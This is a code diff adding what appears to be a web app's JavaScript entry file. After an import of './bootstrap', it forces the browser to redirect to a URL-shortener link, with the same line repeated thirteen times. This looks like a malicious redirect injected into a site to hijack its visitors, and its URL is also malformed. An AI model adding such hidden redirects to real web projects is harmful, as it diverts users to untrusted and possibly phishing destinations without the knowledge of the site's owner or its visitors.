@@ -1,0 +1,14 @@
+import './bootstrap';
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
+window.location.href = "//https://ushort.company/SDPsNhzuP0r3";
